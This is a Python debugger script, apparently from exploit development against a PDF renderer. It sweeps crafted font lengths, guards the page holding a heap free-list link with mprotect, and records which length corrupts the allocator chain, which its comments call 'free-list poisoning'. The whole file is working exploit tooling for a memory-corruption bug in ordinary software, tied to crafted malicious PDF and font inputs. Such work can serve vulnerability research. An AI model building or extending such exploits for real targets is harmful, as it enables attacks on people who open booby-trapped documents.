# RIP-19: free-list poisoning proof — guard the x19 chain-link page, sweep L
# (head band 128..512 step 8 + wild band anchors); SIGSEGV on the link page =
# the strike that poisons the allocator chain = EXACT L banked.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip19_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

# PHASE 1: recon x19 at stop5 for THIS session
bpe = t.BreakpointCreateByName("aa_cache_render")
p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
th = p.GetSelectedThread()
pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
bpw = t.BreakpointCreateByAddress(pc + 1804)
x19 = x27 = 0
for i in range(5):
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
    if st != lldb.eStateStopped: break
    fr = p.GetSelectedThread().GetSelectedFrame()
    x19 = fr.FindRegister("x19").GetValueAsUnsigned()
    x27 = fr.FindRegister("x27").GetValueAsUnsigned()
p.Kill(); t.BreakpointDelete(bpw.GetID()); t.BreakpointDelete(bpe.GetID())
T("recon: x19=%x x27=%x delta=+0x%x" % (x19, x27, x19 - x27))
if not x19:
    T("no recon"); TRACE.close(); sys.exit(0)
LINK = x19  # chain head = first link
LINKPAGE = LINK & ~0xFFF
LINKOFF = LINK - LINKPAGE
T("link=%x page=%x off=%x" % (LINK, LINKPAGE, LINKOFF))

# PHASE 2: per-L guard runs (one L per process; fresh geometry each time but
# x19-x27 delta should hold within session)
def run_guarded(L):
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple(["k2_e%d.pdf" % L, "r.png"], None, CWD)
    if not p or not p.IsValid():
        t.BreakpointDelete(bpe.GetID()); return "launchfail"
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804); bpw.SetOneShot(True)
    xx19 = 0
    for i in range(5):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        xx19 = fr.FindRegister("x19").GetValueAsUnsigned()
        if xx19: break
    if not xx19:
        t.BreakpointDelete(bpe.GetID()); return "nox19"
    # guard the CURRENT x19 chain page (fresh x19 per process)
    page = xx19 & ~0xFFF
    v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % page)
    t.BreakpointDelete(bpw.GetID())
    if v.GetValueAsSigned() != 0:
        t.BreakpointDelete(bpe.GetID()); return "unmapped"
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
    res = "survive"
    if st == lldb.eStateStopped:
        th2 = p.GetSelectedThread()
        fr2 = th2.GetSelectedFrame()
        off = -1
        if fr2.GetSymbol():
            off = fr2.GetPCAddress().GetLoadAddress(t) - fr2.GetSymbol().GetStartAddress().GetLoadAddress(t)
        desc = th2.GetStopDescription(300) or ""
        fa = 0
        if "address=" in desc:
            try: fa = int(desc.split("address=")[1].split(")")[0], 16)
            except Exception: pass
        res = "STRIKE +%d fa=%x %s" % (off, fa, "ON-LINK" if (fa >> 12) == (xx19 >> 12) else "")
        p.Kill()
    t.BreakpointDelete(bpe.GetID())
    return res

# font per L built inline
import subprocess
for L in list(range(128, 513, 8)) + [29840, 31472]:
    f = "k2_e%d.ttf" % L
    if not os.path.exists("k2_e%d.pdf" % L):
        r = subprocess.run(['./venv/bin/python','-c',
            "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (f, L)],
            capture_output=True)
        if r.returncode != 0:
            T("L=%d fontfail" % L); continue
        subprocess.run(['./venv/bin/python','gen_pdf.py',"k2_e%d.pdf" % L, f], capture_output=True)
    res = run_guarded(L)
    T("L=%d %s" % (L, res))
T("RIP-19 DONE")
TRACE.close()
